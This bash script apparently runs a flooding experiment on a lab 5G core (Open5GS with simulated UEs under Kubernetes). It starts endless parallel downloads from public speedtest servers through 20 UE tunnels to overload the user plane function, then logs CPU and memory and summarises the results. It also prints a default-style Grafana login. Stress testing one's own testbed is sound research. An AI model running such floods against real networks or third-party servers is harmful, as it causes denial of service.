#!/bin/bash
# ============================================================
# UPF Flooding Attack Script — Option B (Isolated UPF)
# Monitors BOTH open5gs (CP) and open5gs-upf (UP) namespaces
# Usage: ./upf_flood.sh [duration_seconds]
# ============================================================

DURATION="${1:-120}"
UE_COUNT=20
CP_NS="open5gs"
UP_NS="open5gs-upf"
OUTPUT_DIR="$HOME/upf_attack_$(date +%Y%m%d_%H%M%S)"
CSV_FILE="$OUTPUT_DIR/metrics.csv"

mkdir -p "$OUTPUT_DIR"
echo "timestamp,namespace,pod,cpu_m,mem_mi" > "$CSV_FILE"

echo "=================================================="
echo "  UPF Flooding Attack (Option B)"
echo "  CP Namespace: $CP_NS | UP Namespace: $UP_NS"
echo "  Duration: ${DURATION}s | Output: $OUTPUT_DIR"
echo "=================================================="

# Baseline
echo "[*] Capturing baseline (10s wait)..."
sleep 5
BASELINE_CPU=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $2}')
BASELINE_MEM=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $3}')
echo "    [BASELINE] UPF: CPU=$BASELINE_CPU  MEM=$BASELINE_MEM"

# Start flood via all UE tunnels
echo "[*] Starting flood via $UE_COUNT UE tunnels..."
kubectl exec -n $CP_NS deploy/ueransim-gnb-ues -- sh -c "
for i in \$(seq 0 $((UE_COUNT-1))); do
  TUN_IP=\$(ip addr show uesimtun\${i} 2>/dev/null | grep 'inet ' | awk '{print \$2}' | cut -d/ -f1)
  if [ -n \"\$TUN_IP\" ]; then
    while true; do
      wget -q -O /dev/null --bind-address=\$TUN_IP --timeout=10 \
        http://speedtest.tele2.net/100MB.zip 2>/dev/null || \
      curl -s -o /dev/null --interface uesimtun\${i} --max-time 10 \
        http://ipv4.download.thinkbroadband.com/10MB.zip 2>/dev/null
    done &
  fi
done
wait" &
FLOOD_PID=$!
echo "[*] Flood started (PID=$FLOOD_PID)"
echo ""

# Monitor loop
ELAPSED=0
PEAK_CPU=0
while [ $ELAPSED -lt $DURATION ]; do
  TIMESTAMP=$(date +%s)
  
  # Collect UPF (UP) namespace metrics
  kubectl top pod -n $UP_NS --no-headers 2>/dev/null | while read POD CPU MEM; do
    CPU_VAL=$(echo "$CPU" | sed 's/m//')
    MEM_VAL=$(echo "$MEM" | sed 's/Mi//')
    echo "$TIMESTAMP,$UP_NS,$POD,$CPU_VAL,$MEM_VAL" >> "$CSV_FILE"
  done
  
  # Collect CP namespace metrics
  kubectl top pod -n $CP_NS --no-headers 2>/dev/null | while read POD CPU MEM; do
    CPU_VAL=$(echo "$CPU" | sed 's/m//')
    MEM_VAL=$(echo "$MEM" | sed 's/Mi//')
    echo "$TIMESTAMP,$CP_NS,$POD,$CPU_VAL,$MEM_VAL" >> "$CSV_FILE"
  done

  UPF_CPU=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $2}')
  UPF_MEM=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $3}')
  SMF_CPU=$(kubectl top pod -n $CP_NS --no-headers 2>/dev/null | grep smf | awk '{print $2}')
  AMF_CPU=$(kubectl top pod -n $CP_NS --no-headers 2>/dev/null | grep amf | awk '{print $2}')

  printf "\r  [%3ds/%3ds] UPF: CPU=%-8s MEM=%-8s | SMF: %-8s | AMF: %-8s" \
    "$ELAPSED" "$DURATION" "$UPF_CPU" "$UPF_MEM" "$SMF_CPU" "$AMF_CPU"
  
  sleep 5
  ELAPSED=$((ELAPSED + 5))
done

echo ""
echo ""
echo "[*] Stopping flood..."
kill $FLOOD_PID 2>/dev/null
kubectl exec -n $CP_NS deploy/ueransim-gnb-ues -- sh -c "pkill curl; pkill wget; pkill sh" 2>/dev/null

# Final metrics
sleep 3
PEAK_CPU=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $2}')
PEAK_MEM=$(kubectl top pod -n $UP_NS --no-headers 2>/dev/null | grep upf | awk '{print $3}')

# UPF log for drops
echo "[*] Checking UPF logs for errors during attack..."
kubectl logs -n $UP_NS deploy/open5gs-upf --since=130s 2>/dev/null | grep -iE "drop|error|overflow|fail" | tail -5

echo ""
echo "=================================================="
echo "  Attack Complete!"
echo "  Baseline UPF: CPU=$BASELINE_CPU  MEM=$BASELINE_MEM"
echo "  Final UPF:    CPU=$PEAK_CPU      MEM=$PEAK_MEM"
echo "  Metrics CSV:  $CSV_FILE"
echo "  Grafana URL:  http://$(ip route get 1 | awk '{print $7; exit}'):32000"
echo "  (login: admin / admin123)"
echo "=================================================="

# Generate summary
echo "" >> "$OUTPUT_DIR/attack_summary.txt"
echo "=== UPF FLOOD ATTACK SUMMARY ===" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Date: $(date)" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Duration: ${DURATION}s" >> "$OUTPUT_DIR/attack_summary.txt"
echo "UEs used: $UE_COUNT" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Baseline UPF CPU: $BASELINE_CPU" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Final UPF CPU:    $PEAK_CPU" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Baseline UPF MEM: $BASELINE_MEM" >> "$OUTPUT_DIR/attack_summary.txt"
echo "Final UPF MEM:    $PEAK_MEM" >> "$OUTPUT_DIR/attack_summary.txt"

awk -F',' 'NR>1 && $2=="open5gs-upf" {
  cpu[$3]+=$4; mem[$3]+=$5; count[$3]++
} END {
  for (pod in cpu) {
    if (count[pod] > 0) {
        printf "UPF avg: CPU=%.1fm  MEM=%.1fMi (samples=%d)\n", cpu[pod]/count[pod], mem[pod]/count[pod], count[pod]
    }
  }
}' "$CSV_FILE" >> "$OUTPUT_DIR/attack_summary.txt"

cat "$OUTPUT_DIR/attack_summary.txt"
